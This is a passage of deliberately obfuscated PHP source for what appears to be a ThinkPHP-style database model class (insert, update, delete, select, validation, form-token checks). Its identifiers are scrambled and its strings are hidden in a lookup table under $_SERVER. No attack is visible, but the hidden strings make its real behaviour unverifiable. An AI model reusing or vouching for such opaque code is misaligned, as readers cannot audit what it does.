$ÍĞËğÏ = count($È÷œ—¡) - 1; if (isset($È÷œ—¡[$ÍĞËğÏ]) && $È÷œ—¡[$ÍĞËğÏ] === $âÍşø€) { think_exception(__CLASS__ . $‰Ä²–·Ë[4] . $âÍşø€ . think_lang($‰Ä²–·Ë[303])); return; } $È÷œ—¡[] = $âÍşø€; if (method_exists($this, $‰Ä²–·Ë[304])) { $Ú¤…¾² = call_user_func_array(array($this, $‰Ä²–·Ë[305]), array($Çèª¨şƒ, $È÷œ—¡)); if (!is_null($Ú¤…¾²) && $Ú¤…¾² !== !1) { return $Ú¤…¾²; } } $‰Ê“©—Æ = call_user_func_array(array($this, $âÍşø€), $È÷œ—¡); if (method_exists($this, $‰Ä²–·Ë[306])) { $Ú¤…¾² = call_user_func_array(array($this, $‰Ä²–·Ë[307]), array($Çèª¨şƒ, $È÷œ—¡, $‰Ê“©—Æ)); if ($Ú¤…¾²) { return $Ú¤…¾²; } } return $‰Ê“©—Æ; } protected function _initialize() { } protected function _facade($ëÜœ²ƒ‘) { $æÎÙãéû =& $_SERVER[¹òÍ›æş]; if (!empty($this->fields)) { foreach ($ëÜœ²ƒ‘ as $¶µÉ©— => $„àÖ‰´Í) { if (is_array($this->fields) && !in_array($¶µÉ©—, $this->fields, !0)) { unset($ëÜœ²ƒ‘[$¶µÉ©—]); } elseif (is_scalar($„àÖ‰´Í)) { $this->_parseType($ëÜœ²ƒ‘, $¶µÉ©—); } } } if (!empty($this->options[$æÎÙãéû[308]])) { $ëÜœ²ƒ‘ = array_map($this->options[$æÎÙãéû[308]], $ëÜœ²ƒ‘); unset($this->options[$æÎÙãéû[308]]); } $this->_beforeWrite($ëÜœ²ƒ‘); return $ëÜœ²ƒ‘; } protected function _beforeWrite(&$Ô´ÃÊËí) { } public function add($·×Îıó· = '', $…šÔü¤ = array(), $ÀÔıÄ = false) { if (empty($·×Îıó·)) { if (!empty($this->data)) { $·×Îıó· = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¹òÍ›æş][309]); return !1; } } $…šÔü¤ = $this->_parseOptions($…šÔü¤); $·×Îıó· = $this->_facade($·×Îıó·); if (!1 === $this->_beforeInsert($·×Îıó·, $…šÔü¤)) { return !1; } $È¤­¢òµ = $this->db->insert($·×Îıó·, $…šÔü¤, $ÀÔıÄ); if (!1 !== $È¤­¢òµ) { $Äû°µò£ = $this->getLastInsID(); if ($Äû°µò£) { $·×Îıó·[$this->getPk()] = $Äû°µò£; $this->_after_insert($·×Îıó·, $…šÔü¤); return $Äû°µò£; } $this->_after_insert($·×Îıó·, $…šÔü¤); } return $È¤­¢òµ; } protected function _beforeInsert(&$´´Ìüõ, $ªï±°çú) { } protected function _after_insert($²øÒŒµ, $·ıïóìĞ) { } public function addAll($ë‚¢ªÒ, $ñ“µ¨Çş = array(), $ßÖ¯ôú = false) { $…Ò®–˜ì =& $_SERVER[¹òÍ›æş]; if (empty($ë‚¢ªÒ)) { $this->error = think_lang($…Ò®–˜ì[309]); return !1; } $ñ“µ¨Çş = $this->_parseOptions($ñ“µ¨Çş); foreach ($ë‚¢ªÒ as $ŸÖ·ö„ => $àÎî¬ùÏ) { $ë‚¢ªÒ[$ŸÖ·ö„] = $this->_facade($àÎî¬ùÏ); } if (method_exists($this->db, $…Ò®–˜ì[310])) { $ĞÇü …† = $this->db->insertAll($ë‚¢ªÒ, $ñ“µ¨Çş, $ßÖ¯ôú); } else { $this->startTrans(); foreach ($ë‚¢ªÒ as $ŸÖ·ö„ => $àÎî¬ùÏ) { $ĞÇü …† = $this->db->insert($àÎî¬ùÏ, $ñ“µ¨Çş, $ßÖ¯ôú); } $this->commit(); } if (!1 !== $ĞÇü …†) { $˜Ä£·æ = $this->getLastInsID(); if ($˜Ä£·æ) { return $˜Ä£·æ; } } return $ĞÇü …†; } public function selectAdd($øÂï’ñ¤ = '', $Û˜ùÂë = '', $ÒùŞ = array()) { $ŠÉ’éÊ¬ =& $_SERVER[¹òÍ›æş]; $ÒùŞ = $this->_parseOptions($ÒùŞ); if (!1 === ($Ö†şÕ×ƒ = $this->db->selectInsert($øÂï’ñ¤ ? $øÂï’ñ¤ : $ÒùŞ[$ŠÉ’éÊ¬[311]], $Û˜ùÂë ? $Û˜ùÂë : $this->getTableName(), $ÒùŞ))) { $this->error = think_lang($ŠÉ’éÊ¬[312]); return !1; } else { return $Ö†şÕ×ƒ; } } public function save($ƒÒŒ§ç¯ = '', $ë¤¾Ë¾¤ = array()) { $Ú«×ÈÊÆ =& $_SERVER[¹òÍ›æş]; if (empty($ƒÒŒ§ç¯)) { if (!empty($this->data)) { $ƒÒŒ§ç¯ = $this->data; $this->data = array(); } else { $this->error = think_lang($Ú«×ÈÊÆ[309]); return !1; } } $ƒÒŒ§ç¯ = $this->_facade($ƒÒŒ§ç¯); $ë¤¾Ë¾¤ = $this->_parseOptions($ë¤¾Ë¾¤); $ÎúÃè© = $this->getPk(); if (!isset($ë¤¾Ë¾¤[$Ú«×ÈÊÆ[313]])) { if (isset($ƒÒŒ§ç¯[$ÎúÃè©])) { $åÌ«Â±€[$ÎúÃè©] = $ƒÒŒ§ç¯[$ÎúÃè©]; $ë¤¾Ë¾¤[$Ú«×ÈÊÆ[313]] = $åÌ«Â±€; unset($ƒÒŒ§ç¯[$ÎúÃè©]); } else { $this->error = think_lang($Ú«×ÈÊÆ[312]); return !1; } } if (is_array($ë¤¾Ë¾¤[$Ú«×ÈÊÆ[313]]) && isset($ë¤¾Ë¾¤[$Ú«×ÈÊÆ[313]][$ÎúÃè©])) { $¹Ú–¦Ù = $ë¤¾Ë¾¤[$Ú«×ÈÊÆ[313]][$ÎúÃè©]; } if (!1 === $this->_beforeUpdate($ƒÒŒ§ç¯, $ë¤¾Ë¾¤)) { return !1; } $ç¼„  = $this->db->update($ƒÒŒ§ç¯, $ë¤¾Ë¾¤); if (!1 !== $ç¼„ ) { if (isset($¹Ú–¦Ù)) { $ƒÒŒ§ç¯[$ÎúÃè©] = $¹Ú–¦Ù; } $this->_afterUpdate($ƒÒŒ§ç¯, $ë¤¾Ë¾¤); } return $ç¼„ ; } protected function _beforeUpdate(&$…¬ïĞ, $ùÖ‹â©) { } protected function _afterUpdate($¥­Ÿ•èÄ, $˜ şâÔ¡) { } public function delete($À€—¸îÛ = array()) { $…¿‡Ç±ü =& $_SERVER[¹òÍ›æş]; if (empty($À€—¸îÛ) && empty($this->options[$…¿‡Ç±ü[313]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $äû‚İô = $this->getPk(); if (is_numeric($À€—¸îÛ) || is_string($À€—¸îÛ)) { if (strpos($À€—¸îÛ, $…¿‡Ç±ü[50])) { $Ø­ÙÕ††[$äû‚İô] = array($…¿‡Ç±ü[314], $À€—¸îÛ); } else { $Ø­ÙÕ††[$äû‚İô] = $À€—¸îÛ; } $this->options[$…¿‡Ç±ü[313]] = $Ø­ÙÕ††; } $À€—¸îÛ = $this->_parseOptions(); if (is_array($À€—¸îÛ[$…¿‡Ç±ü[313]]) && isset($À€—¸îÛ[$…¿‡Ç±ü[313]][$äû‚İô])) { $êÅ¥Àã = $À€—¸îÛ[$…¿‡Ç±ü[313]][$äû‚İô]; } $åòãÇ¬· = $this->db->delete($À€—¸îÛ); if (!1 !== $åòãÇ¬·) { $Õœã…¿ = array(); if (isset($êÅ¥Àã)) { $Õœã…¿[$äû‚İô] = $êÅ¥Àã; } $this->_after_delete($Õœã…¿, $À€—¸îÛ); } return $åòãÇ¬·; } protected function _after_delete($ÖŒ©ê‹›, $ŒÊ¾óø¯) { } public function select($£Âšª‚ú = array()) { $ÆÈùûÓŸ =& $_SERVER[¹òÍ›æş]; if (is_string($£Âšª‚ú) || is_numeric($£Âšª‚ú)) { $‚œ¬éšó = $this->getPk(); if (strpos($£Âšª‚ú, $ÆÈùûÓŸ[50])) { $ÂÌÊ‰»[$‚œ¬éšó] = array($ÆÈùûÓŸ[314], $£Âšª‚ú); } else { $ÂÌÊ‰»[$‚œ¬éšó] = $£Âšª‚ú; } $this->options[$ÆÈùûÓŸ[313]] = $ÂÌÊ‰»; } elseif (!1 === $£Âšª‚ú) { $£Âšª‚ú = $this->_parseOptions(); return $ÆÈùûÓŸ[315] . $this->db->buildSelectSql($£Âšª‚ú) . $ÆÈùûÓŸ[316]; } $£Âšª‚ú = $this->_parseOptions(); $©³÷œ = $this->db->select($£Âšª‚ú); if (!1 === $©³÷œ) { return !1; } if (empty($©³÷œ)) { return null; } $this->_afterSelect($©³÷œ, $£Âšª‚ú); return $©³÷œ; } protected function _afterSelect(&$É¶¡õ›, $Õî™é¿—) { } public function buildSql($çÖ¢ûû– = array()) { $µ´Ì½ë¬ =& $_SERVER[¹òÍ›æş]; $çÖ¢ûû– = $this->_parseOptions($çÖ¢ûû–); return $µ´Ì½ë¬[315] . $this->db->buildSelectSql($çÖ¢ûû–) . $µ´Ì½ë¬[316]; } public function optionsValue($ªñ·Ã¡ = null) { if (is_null($ªñ·Ã¡)) { return $this->options; } elseif (is_array($ªñ·Ã¡)) { $this->options = array_merge($this->options, $ªñ·Ã¡); } } protected function _parseOptions($İÅëûİ = array()) { $¯«šÓ =& $_SERVER[¹òÍ›æş]; if (is_array($İÅëûİ)) { $İÅëûİ = array_merge($this->options, $İÅëûİ); } $this->options = array(); if (!isset($İÅëûİ[$¯«šÓ[317]])) { $İÅëûİ[$¯«šÓ[317]] = $this->getTableName(); $à’«¨àÍ = $this->fields; } else { $à’«¨àÍ = $this->getDbFields(); } if (!empty($İÅëûİ[$¯«šÓ[318]])) { $İÅëûİ[$¯«šÓ[317]] .= $¯«šÓ[53] . $İÅëûİ[$¯«šÓ[318]]; } $İÅëûİ[$¯«šÓ[319]] = $this->name; if (isset($İÅëûİ[$¯«šÓ[313]]) && is_array($İÅëûİ[$¯«šÓ[313]]) && !empty($à’«¨àÍ) && !isset($İÅëûİ[$¯«šÓ[320]]) && !isset($İÅëûİ[$¯«šÓ[317]])) { foreach ($İÅëûİ[$¯«šÓ[313]] as $š–Š‚¾« => $è•‡æ¤) { $š–Š‚¾« = trim($š–Š‚¾«); if (in_array($š–Š‚¾«, $à’«¨àÍ, !0)) { if (is_scalar($è•‡æ¤)) { $this->_parseType($İÅëûİ[$¯«šÓ[313]], $š–Š‚¾«); } } elseif (!is_numeric($š–Š‚¾«) && $¯«šÓ[11] != substr($š–Š‚¾«, 0, 1) && !1 === strpos($š–Š‚¾«, $¯«šÓ[10]) && !1 === strpos($š–Š‚¾«, $¯«šÓ[298]) && !1 === strpos($š–Š‚¾«, $¯«šÓ[321]) && !1 === strpos($š–Š‚¾«, $¯«šÓ[322])) { unset($İÅëûİ[$¯«šÓ[313]][$š–Š‚¾«]); } } } $this->_options_filter($İÅëûİ); return $İÅëûİ; } protected function _options_filter(&$õÊ¶‘¤‘) { } protected function _parseType(&$¢ëÈ­„ü, $öŸ÷ö·Ë) { $«®»ßƒî =& $_SERVER[¹òÍ›æş]; if (empty($this->options[$«®»ßƒî[323]][$«®»ßƒî[4] . $öŸ÷ö·Ë])) { $ˆ×Íç— = strtolower($this->fields[$«®»ßƒî[290]][$öŸ÷ö·Ë]); if (!1 !== strpos($ˆ×Íç—, $«®»ßƒî[324])) { } elseif (!1 === strpos($ˆ×Íç—, $«®»ßƒî[325]) && !1 !== strpos($ˆ×Íç—, $«®»ßƒî[326])) { $¢ëÈ­„ü[$öŸ÷ö·Ë] = intval($¢ëÈ­„ü[$öŸ÷ö·Ë]); } elseif (!1 !== strpos($ˆ×Íç—, $«®»ßƒî[327]) || !1 !== strpos($ˆ×Íç—, $«®»ßƒî[328])) { $¢ëÈ­„ü[$öŸ÷ö·Ë] = floatval($¢ëÈ­„ü[$öŸ÷ö·Ë]); } elseif (!1 !== strpos($ˆ×Íç—, $«®»ßƒî[329])) { $¢ëÈ­„ü[$öŸ÷ö·Ë] = (bool) $¢ëÈ­„ü[$öŸ÷ö·Ë]; } } } public function find($–£ëøä = array()) { $Ÿ¾¹çä =& $_SERVER[¹òÍ›æş]; if (is_numeric($–£ëøä) || is_string($–£ëøä)) { $ÕüÜŠ[$this->getPk()] = intval($–£ëøä); $this->options[$Ÿ¾¹çä[313]] = $ÕüÜŠ; } $this->options[$Ÿ¾¹çä[330]] = 1; $–£ëøä = $this->_parseOptions(); $È¨¸ÑÅ¯ = $this->db->select($–£ëøä); if (!1 === $È¨¸ÑÅ¯) { return !1; } if (empty($È¨¸ÑÅ¯)) { return null; } $this->data = $È¨¸ÑÅ¯[0]; $this->_afterFind($this->data, $–£ëøä); if (!empty($this->options[$Ÿ¾¹çä[331]])) { return $this->returnResult($this->data, $this->options[$Ÿ¾¹çä[331]]); } return $this->data; } protected function _afterFind(&$ä¼©—ö—, $Ûßµ™É) { } protected function returnResult($š…®…Â, $Û¶–öÇµ = '') { $‘¥‘œ‹ =& $_SERVER[¹òÍ›æş]; if ($Û¶–öÇµ) { if (is_callable($Û¶–öÇµ)) { return call_user_func($Û¶–öÇµ, $š…®…Â); } switch (strtolower($Û¶–öÇµ)) { case $‘¥‘œ‹[332]: return json_encode($š…®…Â); case $‘¥‘œ‹[333]: return xml_encode($š…®…Â); } } return $š…®…Â; } public function parseFieldsMap($Ÿ«½Ì¿‡, $¹·ÀËéš = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ØÛá–ñ => $Â¶ç‰¾ß) { if ($¹·ÀËéš == 1) { if (isset($Ÿ«½Ì¿‡[$Â¶ç‰¾ß])) { $Ÿ«½Ì¿‡[$ØÛá–ñ] = $Ÿ«½Ì¿‡[$Â¶ç‰¾ß]; unset($Ÿ«½Ì¿‡[$Â¶ç‰¾ß]); } } else { if (isset($Ÿ«½Ì¿‡[$ØÛá–ñ])) { $Ÿ«½Ì¿‡[$Â¶ç‰¾ß] = $Ÿ«½Ì¿‡[$ØÛá–ñ]; unset($Ÿ«½Ì¿‡[$ØÛá–ñ]); } } } } return $Ÿ«½Ì¿‡; } public function setField($’”«Ìæá, $ó¡ôè¼Ö = '') { if (is_array($’”«Ìæá)) { $ğ°ˆã½æ = $’”«Ìæá; } else { $ğ°ˆã½æ[$’”«Ìæá] = $ó¡ôè¼Ö; } return $this->save($ğ°ˆã½æ); } public function setAdd($¼¸ææå«, $è¯ù¼Æ = 1) { $ƒ¹÷şµ =& $_SERVER[¹òÍ›æş]; $çß·’µÓ = $¼¸ææå« . $ƒ¹÷şµ[334] . $è¯ù¼Æ; if ($è¯ù¼Æ < 0) { $çß·’µÓ = $¼¸ææå« . $è¯ù¼Æ; } return $this->setField($¼¸ææå«, array($ƒ¹÷şµ[335], $çß·’µÓ)); } public function getField($­Æ‡Ã£, $Õ‚Ÿ»œî = null) { $ÒÃ†ıÙş =& $_SERVER[¹òÍ›æş]; $Å¬½²ò™[$ÒÃ†ıÙş[311]] = $­Æ‡Ã£; $Å¬½²ò™ = $this->_parseOptions($Å¬½²ò™); $­Æ‡Ã£ = trim($­Æ‡Ã£); if (strpos($­Æ‡Ã£, $ÒÃ†ıÙş[50])) { if (!isset($Å¬½²ò™[$ÒÃ†ıÙş[330]])) { $Å¬½²ò™[$ÒÃ†ıÙş[330]] = is_numeric($Õ‚Ÿ»œî) ? $Õ‚Ÿ»œî : $ÒÃ†ıÙş[12]; } $ÉÙ²ÚÑ = $this->db->select($Å¬½²ò™); if (!empty($ÉÙ²ÚÑ)) { $ôŸ¼ òÑ = explode($ÒÃ†ıÙş[50], $­Æ‡Ã£); $­Æ‡Ã£ = array_keys($ÉÙ²ÚÑ[0]); $ì£æéÆ´ = array_shift($­Æ‡Ã£); $“ˆóúş¤ = array_shift($­Æ‡Ã£); $§ÏÜï¼Ù = array(); $µ¡ªµËÑ = count($ôŸ¼ òÑ); foreach ($ÉÙ²ÚÑ as $ª»óÔ–Ÿ) { $›ù¦µµ· = $ª»óÔ–Ÿ[$ì£æéÆ´]; if (2 == $µ¡ªµËÑ) { $§ÏÜï¼Ù[$›ù¦µµ·] = $ª»óÔ–Ÿ[$“ˆóúş¤]; } else { $§ÏÜï¼Ù[$›ù¦µµ·] = is_string($Õ‚Ÿ»œî) ? implode($Õ‚Ÿ»œî, $ª»óÔ–Ÿ) : $ª»óÔ–Ÿ; } } return $§ÏÜï¼Ù; } } else { if (!0 !== $Õ‚Ÿ»œî) { $Å¬½²ò™[$ÒÃ†ıÙş[330]] = is_numeric($Õ‚Ÿ»œî) ? $Õ‚Ÿ»œî : 1; } if ($Õ‚Ÿ»œî === $ÒÃ†ıÙş[293]) { unset($Å¬½²ò™[$ÒÃ†ıÙş[330]]); } $ª»óÔ–Ÿ = $this->db->select($Å¬½²ò™); if (!empty($ª»óÔ–Ÿ)) { if ($Õ‚Ÿ»œî === $ÒÃ†ıÙş[293]) { return reset($ª»óÔ–Ÿ[0]); } if (!0 !== $Õ‚Ÿ»œî && 1 == $Å¬½²ò™[$ÒÃ†ıÙş[330]]) { return reset($ª»óÔ–Ÿ[0]); } foreach ($ª»óÔ–Ÿ as $óóĞ¯Ï) { $˜É˜×’á[] = $óóĞ¯Ï[$­Æ‡Ã£]; } return $˜É˜×’á; } } return null; } public function create($€ÇÑÙ¨Å = '', $¿”Şâ¶º = '') { $¨ûØ¬® =& $_SERVER[¹òÍ›æş]; if (empty($€ÇÑÙ¨Å)) { $€ÇÑÙ¨Å = $_POST; } elseif (is_object($€ÇÑÙ¨Å)) { $€ÇÑÙ¨Å = get_object_vars($€ÇÑÙ¨Å); } if (empty($€ÇÑÙ¨Å) || !is_array($€ÇÑÙ¨Å)) { $this->error = think_lang($¨ûØ¬®[309]); return !1; } $€ÇÑÙ¨Å = $this->parseFieldsMap($€ÇÑÙ¨Å, 0); $¿”Şâ¶º = $¿”Şâ¶º ? $¿”Şâ¶º : (!empty($€ÇÑÙ¨Å[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$¨ûØ¬®[311]])) { $şÃ„èµ = $this->options[$¨ûØ¬®[311]]; unset($this->options[$¨ûØ¬®[311]]); } elseif ($¿”Şâ¶º == THINK_MODEL_INSERT && isset($this->insertFields)) { $şÃ„èµ = $this->insertFields; } elseif ($¿”Şâ¶º == THINK_MODEL_UPDATE && isset($this->updateFields)) { $şÃ„èµ = $this->updateFields; } if (isset($şÃ„èµ)) { if (is_string($şÃ„èµ)) { $şÃ„èµ = explode($¨ûØ¬®[50], $şÃ„èµ); } if (think_config($¨ûØ¬®[336])) { $şÃ„èµ[] = think_config($¨ûØ¬®[337]); } foreach ($€ÇÑÙ¨Å as $ÍØƒõú‹ => $¾•™ƒéó) { if (!in_array($ÍØƒõú‹, $şÃ„èµ)) { unset($€ÇÑÙ¨Å[$ÍØƒõú‹]); } } } if (!$this->autoValidation($€ÇÑÙ¨Å, $¿”Şâ¶º)) { return !1; } if (!$this->autoCheckToken($€ÇÑÙ¨Å)) { $this->error = think_lang($¨ûØ¬®[338]); return !1; } if ($this->autoCheckFields) { $şÃ„èµ = $this->getDbFields(); foreach ($€ÇÑÙ¨Å as $ÍØƒõú‹ => $¾•™ƒéó) { if (!in_array($ÍØƒõú‹, $şÃ„èµ)) { unset($€ÇÑÙ¨Å[$ÍØƒõú‹]); } elseif (MAGIC_QUOTES_GPC && is_string($¾•™ƒéó)) { $€ÇÑÙ¨Å[$ÍØƒõú‹] = stripslashes($¾•™ƒéó); } } } $this->autoOperation($€ÇÑÙ¨Å, $¿”Şâ¶º); $this->data = $€ÇÑÙ¨Å; return $€ÇÑÙ¨Å; } public function autoCheckToken($åÌÎ‚™Å) { $³¼ù¿Ó‘ =& $_SERVER[¹òÍ›æş]; if (isset($this->options[$³¼ù¿Ó‘[339]]) && !$this->options[$³¼ù¿Ó‘[339]]) { return !0; } if (think_config($³¼ù¿Ó‘[336])) { $Ú€˜¥„® = think_config($³¼ù¿Ó‘[337]); if (!isset($åÌÎ‚™Å[$Ú€˜¥„®]) || Session::get($Ú€˜¥„®)) { return !1; } list($„ëîş·ô, $Íü®÷£„) = explode($³¼ù¿Ó‘[11], $åÌÎ‚™Å[$Ú€˜¥„®]); if ($Íü®÷£„ && Session::get($Ú€˜¥„® . $³¼ù¿Ó‘[10] . $„ëîş·ô) === $Íü®÷£„) { Session::remove($Ú€˜¥„® . $³¼ù¿Ó‘[10] . $„ëîş·ô); return !0; } if (think_config($³¼ù¿Ó‘[340])) { Session::remove($Ú€˜¥„® . $³¼ù¿Ó‘[10] . $„ëîş·ô); } return !1; } return !0; } public function regex($ŠĞ–áÊó, $î’æå«€) { $ö´ßåæ¾ =& $_SERVER[¹òÍ›æş]; $¾ÈŒ è÷ = array($ö´ßåæ¾[341] => $ö´ßåæ¾[342], $ö´ßåæ¾[343] => $ö´ßåæ¾[344], $ö´ßåæ¾[345] => $ö´ßåæ¾[346], $ö´ßåæ¾[347] => $ö´ßåæ¾[348], $ö´ßåæ¾[349] => $ö´ßåæ¾[350], $ö´ßåæ¾[351] => $ö´ßåæ¾[352], $ö´ßåæ¾[353] => $ö´ßåæ¾[354], $ö´ßåæ¾[328] => $ö´ßåæ¾[355], $ö´ßåæ¾[356] => $ö´ßåæ¾[357]); if (isset($¾ÈŒ è÷[strtolower($î’æå«€)])) { $î’æå«€ = $¾ÈŒ è÷[strtolower($î’æå«€)]; } return preg_match($î’æå«€, $ŠĞ–áÊó) === 1; } private function autoOperation(&$É×ºö¦ş, $ãîæÑæå) { $ÁöëùÈÄ =& $_SERVER[¹òÍ›æş]; if (!empty($this->options[$ÁöëùÈÄ[358]])) { $‰ÌÕ±ÜÖ = $this->options[$ÁöëùÈÄ[358]]; unset($this->options[$ÁöëùÈÄ[358]]); } elseif (!empty($this->_auto)) { $‰ÌÕ±ÜÖ = $this->_auto; } if (isset($‰ÌÕ±ÜÖ)) { foreach ($‰ÌÕ±ÜÖ as $°€ÂÃ) { if (empty($°€ÂÃ[2])) { $°€ÂÃ[2] = THINK_MODEL_INSERT; } if ($ãîæÑæå == $°€ÂÃ[2] || $°€ÂÃ[2] == THINK_MODEL_BOTH) { switch (trim($°€ÂÃ[3])) { case $ÁöëùÈÄ[359]: case $ÁöëùÈÄ[360]: $æİšÓŞ = isset($°€ÂÃ[4]) ? (array) $°€ÂÃ[4] : array(); if (isset($É×ºö¦ş[$°€ÂÃ[0]])) { array_unshift($æİšÓŞ, $É×ºö¦ş[$°€ÂÃ[0]]); } if ($ÁöëùÈÄ[359] == $°€ÂÃ[3]) { $É×ºö¦ş[$°€ÂÃ[0]] = call_user_func_array($°€ÂÃ[1], $æİšÓŞ); } else { $É×ºö¦ş[$°€ÂÃ[0]] = call_user_func_array(array(&$this, $°€ÂÃ[1]), $æİšÓŞ); } break; case $ÁöëùÈÄ[311]: $É×ºö¦ş[$°€ÂÃ[0]] = $É×ºö¦ş[$°€ÂÃ[1]]; break; case $ÁöëùÈÄ[361]: if ($ÁöëùÈÄ[12] === $É×ºö¦ş[$°€ÂÃ[0]]) { unset($É×ºö¦ş[$°€ÂÃ[0]]); } break; case $ÁöëùÈÄ[362]: default: $É×ºö¦ş[$°€ÂÃ[0]] = $°€ÂÃ[1]; } if (!1 === $É×ºö¦ş[$°€ÂÃ[0]]) { unset($É×ºö¦ş[$°€ÂÃ[0]]); } } } } return $É×ºö¦ş; } protected function autoValidation($ËÃûÂ„½, $Ş …«Üé) { $‹û™âì» =& $_SERVER[¹òÍ›æş]; if (!empty($this->options[$‹û™âì»[363]])) { $Áé±çâ = $this->options[$‹û™âì»[363]]; unset($this->options[$‹û™âì»[363]]); } elseif (!empty($this->_validate)) { $Áé±çâ = $this->_validate; } if (isset($Áé±çâ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($Áé±çâ as $™ø¡®¥á => $èºÁŠ½×) { if (empty($èºÁŠ½×[5]) || $èºÁŠ½×[5] == THINK_MODEL_BOTH || $èºÁŠ½×[5] == $Ş …«Üé) { if (0 == strpos($èºÁŠ½×[2], $‹û™âì»[364]) && strpos($èºÁŠ½×[2], $‹û™âì»[365])) { $èºÁŠ½×[2] = think_lang(substr($èºÁŠ½×[2], 2, -1)); } $èºÁŠ½×[3] = isset($èºÁŠ½×[3]) ? $èºÁŠ½×[3] : THINK_EXISTS_VALIDATE; $èºÁŠ½×[4] = isset($èºÁŠ½×[4]) ? $èºÁŠ½×[4] : $‹û™âì»[366]; switch ($èºÁŠ½×[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ËÃûÂ„½, $èºÁŠ½×)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($‹û™âì»[12] != trim($ËÃûÂ„½[$èºÁŠ½×[0]])) { if (!1 === $this->_validationField($ËÃûÂ„½, $èºÁŠ½×)) { return !1; } } break; default: if (isset($ËÃûÂ„½[$èºÁŠ½×[0]])) { if (!1 === $this->_validationField($ËÃûÂ„½, $èºÁŠ½×)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($”ÀĞˆâ­, $®Ğ¨®Ã…) { if (!1 === $this->_validationFieldItem($”ÀĞˆâ­, $®Ğ¨®Ã…)) { if ($this->patchValidate) { $this->error[$®Ğ¨®Ã…[0]] = $®Ğ¨®Ã…[2]; } else { $this->error = $®Ğ¨®Ã…[2]; return !1; } } return; } protected function _validationFieldItem($íà™€áè, $ÌÑ‘“ğ­) { $Ÿœø¦Æë =& $_SERVER[¹òÍ›æş]; switch (strtolower(trim($ÌÑ‘“ğ­[4]))) { case $Ÿœø¦Æë[359]: case $Ÿœø¦Æë[360]: $ÕòâÙÚï = isset($ÌÑ‘“ğ­[6]) ? (array) $ÌÑ‘“ğ­[6] : array(); if (is_string($ÌÑ‘“ğ­[0]) && strpos($ÌÑ‘“ğ­[0], $Ÿœø¦Æë[50])) { $ÌÑ‘“ğ­[0] = explode($Ÿœø¦Æë[50], $ÌÑ‘“ğ­[0]); } if (is_array($ÌÑ‘“ğ­[0])) { foreach ($ÌÑ‘“ğ­[0] as $±ãĞè•¶) { $››–Â·[$±ãĞè•¶] = $íà™€áè[$±ãĞè•¶]; } array_unshift($ÕòâÙÚï, $››–Â·); } else { array_unshift($ÕòâÙÚï, $íà™€áè[$ÌÑ‘“ğ­[0]]); } if ($Ÿœø¦Æë[359] == $ÌÑ‘“ğ­[4]) { return call_user_func_array($ÌÑ‘“ğ­[1], $ÕòâÙÚï); } else { return call_user_func_array(array(&$this, $ÌÑ‘“ğ­[1]), $ÕòâÙÚï); } case $Ÿœø¦Æë[367]: return $íà™€áè[$ÌÑ‘“ğ­[0]] == $íà™€áè[$ÌÑ‘“ğ­[1]]; case $Ÿœø¦Æë[368]: if (is_string($ÌÑ‘“ğ­[0]) && strpos($ÌÑ‘“ğ­[0], $Ÿœø¦Æë[50])) { $ÌÑ‘“ğ­[0] = explode($Ÿœø¦Æë[50], $ÌÑ‘“ğ­[0]); } $˜ÆÍ™… = array(); if (is_array($ÌÑ‘“ğ­[0])) { foreach ($ÌÑ‘“ğ­[0] as $±ãĞè•¶) { $˜ÆÍ™…[$±ãĞè•¶] = $íà™€áè[$±ãĞè•¶]; } } else { $˜ÆÍ™…[$ÌÑ‘“ğ­[0]] = $íà™€áè[$ÌÑ‘“ğ­[0]]; } if (!empty($íà™€áè[$this->getPk()])) { $˜ÆÍ™…[$this->getPk()] = array($Ÿœø¦Æë[369], $íà™€áè[$this->getPk()]); } if ($this->where($˜ÆÍ™…)->find()) { return !1; } return !0; default: return $this->check($íà™€áè[$ÌÑ‘“ğ­[0]], $ÌÑ‘“ğ­[1], $ÌÑ‘“ğ­[4]); } } public function check($”±£í™Š, $¥¨Ìıù¬, $ã¸¬Íšê = "\x72\145\147\x65\x78") { $Öâ¹úÜ =& $_SERVER[¹òÍ›æş]; $ã¸¬Íšê = strtolower(trim($ã¸¬Íšê)); switch ($ã¸¬Íšê) { case $Öâ¹úÜ[7]: case $Öâ¹úÜ[370]: $¯ÍÅ³¾¹ = is_array($¥¨Ìıù¬) ? $¥¨Ìıù¬ : explode($Öâ¹úÜ[50], $¥¨Ìıù¬); return $ã¸¬Íšê == $Öâ¹úÜ[7] ? in_array($”±£í™Š, $¯ÍÅ³¾¹) : !in_array($”±£í™Š, $¯ÍÅ³¾¹); case $Öâ¹úÜ[371]: case $Öâ¹úÜ[372]: if (is_array($¥¨Ìıù¬)) { $¿Õ˜Öİ = $¥¨Ìıù¬[0]; $ıâü«Ì = $¥¨Ìıù¬[1]; } else { list($¿Õ˜Öİ, $ıâü«Ì) = explode($Öâ¹úÜ[50], $¥¨Ìıù¬); } return $ã¸¬Íšê == $Öâ¹úÜ[371] ? $”±£í™Š >= $¿Õ˜Öİ && $”±£í™Š <= $ıâü«Ì : $”±£í™Š < $¿Õ˜Öİ || $”±£í™Š > $ıâü«Ì; case $Öâ¹úÜ[373]: case $Öâ¹úÜ[374]: return $ã¸¬Íšê == $Öâ¹úÜ[373] ? $”±£í™Š == $¥¨Ìıù¬ : $”±£í™Š != $¥¨Ìıù¬; case $Öâ¹úÜ[375]: $¯º®æ›à = mb_strlen($”±£í™Š, $Öâ¹úÜ[376]); if (strpos($¥¨Ìıù¬, $Öâ¹úÜ[50])) { list($¿Õ˜Öİ, $ıâü«Ì) = explode($Öâ¹úÜ[50], $¥¨Ìıù¬); return $¯º®æ›à >= $¿Õ˜Öİ && $¯º®æ›à <= $ıâü«Ì; } else { return $¯º®æ›à == $¥¨Ìıù¬; } case $Öâ¹úÜ[377]: list($Š†Ü…ï, $…ŒÒè™) = explode($Öâ¹úÜ[50], $¥¨Ìıù¬); if (!is_numeric($Š†Ü…ï)) { $Š†Ü…ï = strtotime($Š†Ü…ï); } if (!is_numeric($…ŒÒè™)) { $…ŒÒè™ = strtotime($…ŒÒè™); } return NOW_TIME >= 